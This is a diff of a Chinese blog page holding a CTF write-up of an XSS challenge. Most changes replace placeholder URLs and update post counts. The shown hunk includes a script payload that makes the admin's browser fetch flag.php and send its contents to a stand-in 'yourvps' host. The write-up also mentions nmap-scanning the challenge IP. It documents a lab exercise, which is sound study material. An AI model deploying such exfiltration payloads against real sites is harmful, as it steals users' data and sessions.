@@ -92,7 +92,7 @@
 <meta name="description" content="xss">
 <meta property="og:type" content="article">
 <meta property="og:title" content="XMAN夏令营-2017-XSS-writeup">
-<meta property="og:url" content="http://yoursite.com/2017/08/22/XMAN夏令营-2017-XSS-writeup/index.html">
+<meta property="og:url" content="http://chybeta.github.io/2017/08/22/XMAN夏令营-2017-XSS-writeup/index.html">
 <meta property="og:site_name" content="Chybeta">
 <meta property="og:description" content="xss">
 <meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170822/9.png?raw=true">
@@ -129,7 +129,7 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2017/08/22/XMAN夏令营-2017-XSS-writeup/"/>
+  <link rel="canonical" href="http://chybeta.github.io/2017/08/22/XMAN夏令营-2017-XSS-writeup/"/>
 
 
 
@@ -301,7 +301,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/08/22/XMAN夏令营-2017-XSS-writeup/">
+  <link itemprop="mainEntityOfPage" href="http://chybeta.github.io/2017/08/22/XMAN夏令营-2017-XSS-writeup/">
 
   <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
     <meta itemprop="name" content="chybeta">
@@ -419,7 +419,7 @@
 <h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>没有csp头。但没办法直接得到cookie。</p>
 <p>另外有一个flag.php，访问后如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">only admin can see the flag!</div></pre></td></tr></table></figure></p>
 <p>我们先控制admin访问flag.php，之后再发送数据到我们vps上。</p>
-<p>payload：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">  <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</div><div class="line">  xhr.open(<span class="string">"GET"</span>, <span class="string">"http://202.112.51.217:43425/flag.php"</span>, <span class="literal">false</span>);</div><div class="line">  xhr.send();</div><div class="line">  a=xhr.responseText;</div><div class="line">  location.href=<span class="string">"http://yourvps/?a="</span>+<span class="built_in">escape</span>(a);</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure></p>
+<p>payload：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">  <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</div><div class="line">  xhr.open(<span class="string">"GET"</span>, <span class="string">"http://202.112.51.217:43425/flag.php"</span>, <span class="literal">false</span>);</div><div class="line">  xhr.send();</div><div class="line">  a=xhr.responseText;</div><div class="line">  location.href=<span class="string">"http://yourvps/?a="</span>+<span class="built_in">escape</span>(a);</div><div class="line"><span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></div></pre></td></tr></table></figure></p>
 <p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170822/12.png?raw=true" alt=""></p>
 <p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">xman&#123;OH_Y0u_G37_mY_secreT_F14G!&#125;</div></pre></td></tr></table></figure></p>
 <h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这些夏令营的题目是看到了一份wp，然后直接用nmap把ip的所有端口都扫了一遍：），然后扫出了一些web题：）</p>
@@ -439,8 +439,8 @@
   <p><span>文章作者:</span><a href="/" title="访问 chybeta 的个人博客">chybeta</a></p>
   <p><span>发布时间:</span>2017年08月22日 - 18:08</p>
   <p><span>最后更新:</span>2017年08月22日 - 21:08</p>
-  <p><span>原始链接:</span><a href="/2017/08/22/XMAN夏令营-2017-XSS-writeup/" title="XMAN夏令营-2017-XSS-writeup">http://yoursite.com/2017/08/22/XMAN夏令营-2017-XSS-writeup/</a>
-    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://yoursite.com/2017/08/22/XMAN夏令营-2017-XSS-writeup/"  aria-label="复制成功！"></i></span>
+  <p><span>原始链接:</span><a href="/2017/08/22/XMAN夏令营-2017-XSS-writeup/" title="XMAN夏令营-2017-XSS-writeup">http://chybeta.github.io/2017/08/22/XMAN夏令营-2017-XSS-writeup/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://chybeta.github.io/2017/08/22/XMAN夏令营-2017-XSS-writeup/"  aria-label="复制成功！"></i></span>
   </p>
   <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>
 </div>
@@ -594,7 +594,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">117</span>
+                <span class="site-state-item-count">118</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -612,7 +612,7 @@
           
             <div class="site-state-item site-state-tags">
               <a href="/tags">
-                <span class="site-state-item-count">51</span>
+                <span class="site-state-item-count">53</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
